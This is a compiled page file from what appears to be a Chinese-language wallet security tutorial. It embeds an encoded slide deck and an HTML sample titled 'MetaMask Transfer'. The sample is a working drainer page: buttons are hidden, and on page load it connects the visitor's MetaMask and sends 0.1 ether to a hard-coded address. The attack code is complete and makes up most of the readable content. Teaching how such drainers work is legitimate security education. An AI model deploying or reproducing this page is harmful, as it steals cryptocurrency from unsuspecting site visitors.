import{_ as e,K as o,L as c,a5 as s,M as n,N as l,W as u,F as a}from"./framework-edebdfe1.js";const i={},k=n("h1",{id:"钱包安全",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#钱包安全","aria-hidden":"true"},"#"),l(" 钱包安全")],-1),r=n("div",{class:"hint-container warning"},[n("p",{class:"hint-container-title"},"DeeLMind 提示"),n("p",null,"PPT 放大请按F，退出最大化请按ESC")],-1),d=u(`<div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>MetaMask Transfer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>connectButton<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span>Connect MetaMask<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>transferButton<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span>Transfer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">let</span> web3<span class="token punctuation">;</span>

        <span class="token comment">// 检查 MetaMask 是否安装</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> window<span class="token punctuation">.</span>ethereum <span class="token operator">!==</span> <span class="token string">&#39;undefined&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            web3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Web3</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>ethereum<span class="token punctuation">)</span><span class="token punctuation">;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;MetaMask is installed!&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;Please install MetaMask to use this dApp!&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 连接 MetaMask</span>
        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">connectMetaMask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">await</span> ethereum<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">&#39;eth_requestAccounts&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;MetaMask connected&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">autoTransfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&#39;User rejected the request&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 转账</span>
        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">autoTransfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> accounts <span class="token operator">=</span> <span class="token keyword">await</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getAccounts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">const</span> fromAddress <span class="token operator">=</span> accounts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">const</span> toAddress <span class="token operator">=</span> <span class="token string">&#39;0xfb0bc05F1aC61a566E70890e0e000E66F147ae66&#39;</span><span class="token punctuation">;</span> <span class="token comment">// 替换为接收地址</span>
            <span class="token keyword">const</span> amount <span class="token operator">=</span> web3<span class="token punctuation">.</span>utils<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token string">&#39;0.1&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;ether&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 替换为要转账的金额</span>

            web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
                <span class="token literal-property property">from</span><span class="token operator">:</span> fromAddress<span class="token punctuation">,</span>
                <span class="token literal-property property">to</span><span class="token operator">:</span> toAddress<span class="token punctuation">,</span>
                <span class="token literal-property property">value</span><span class="token operator">:</span> amount
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;transactionHash&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">hash</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;Transaction sent. Hash:&#39;</span><span class="token punctuation">,</span> hash<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;receipt&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">receipt</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;Transaction confirmed. Receipt:&#39;</span><span class="token punctuation">,</span> receipt<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;error&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">error</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&#39;Transaction failed:&#39;</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 自动连接并转账</span>
        window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;load&#39;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">await</span> <span class="token function">connectMetaMask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function v(m,b){const t=a("Presentation"),p=a("DocsAD");return o(),c("div",null,[k,r,s(t,{id:"presentation-8",code:"eJyNVUtPG1cU3vtXuEKVEqRAUvpcpkqlql0ElUUqVZWgESIkMUbgKtsx+I2fmLdN7CF+BeiMCcSPGU/8Yzrn3jsr/kLP9R2PB2gQm/Gcc7/z+s43154x77OffpzyPpt7/Xo+4J1+sbj6YnFpwfs4EJh7/srj4YfW5hkkw9Zm3jrrkS0dorrH8+CBxzM25jV1yezGyJ46womzce+Tx9PT+MM+hkytThWZZiOmViF7eXRC+NTarNJ6kD8HR9yZeM+UJlNTtmeQx0YWOmDkTS1t5VtMTkJKnmUXNci0Zz0eO8tNBKgRWg4iwkkMxQb09/j7IFgAyG4LMqqpV0nwCCqpm6NdHdxtXfZi1wi77MUxwuxItJ6iRo7qRYEkO13oZS57SWEyKWxJB6wfNXvH7F2YxLK8hb7MPu7QgxAob00jTw6rTD2zjnchswvKOYb8K62J7r74Y37lz3uTi76F1ck3839NTb4ZbG/y0cTL5YX7zgSjnUAsQs/sreFKDBy3ZW9r3EvlU7eJJFGtPzrVOuyi4V7tlcykeIrHPCvZ19i6AdkY1Wq4aFPb5KNo+Xu8w4mXq/d5buWIxNr0REUmaF2HREO8QzyFLyQhkaLKYWoEV4rsOptDXulWCXm6IqSb7Vzb1ZBjSyqPMFhPEEu3GtiNafTxhTv7BSYlIdiGzA6EW8Mmkq4mkjTUgmyaHq8jRoSjvq1ozlmN0w3vwya/J0EmxwUxWoHwuVGCeWh/IMW4HVfSqCyZnYQAI8DUdRLKsOY6lhYYZiD9NZ71/2vb6pMOWVsd1kadkaBKskWrEOEjyQpTKrSgkHIUTy0pAtkcCoa8zTqd/fz06a+CD3sLa13ebzMinNij2Stbx1G+32IKEjLsN7h2ChckXX3yt29Z4MhOFJXGW9CS5FQm8TymF5WdUjdXc7vmv5pYXhpq/nOYKRdm3PvLDPkgI8uQKGNb6JgJ+Ffmf5+ZudbY7Tm/vkPdb+6A+fYOmO9cGFzy5yhCwvc/gVaDbh9yCc5ls03+SY5MRYPDAkpGqAmyIS7KTxWIcB0JpxAPv7pO9s3OBjMMpywocQg3QNeYogydYxgw0Gp6DbbtK9tW5tGJ2VfIVhfvQ7JbJufbjx4+/JLV30Hk/Hq0GMXRZ+eAd6RU8E7EK2T0eSh7eI2STtkK5u3WODjFakFm6HgfkHSMHK7/5vcHRgWgtmYa25YUJxvvRYJRGR6JpQVp+D3QiyOHNGHS4gbphEn1AIeAbM3saA6ZpFTFUyiVIJtCc5Y1GyScFk/8zxE1fPOBOd/c6quJ536f2/SvLLjNRb/bCviXr4Qu3S6O7+8goB8E5j/8NiP/",theme:"auto"}),s(p),d])}const y=e(i,[["render",v],["__file","wallet.html.vue"]]);export{y as default};
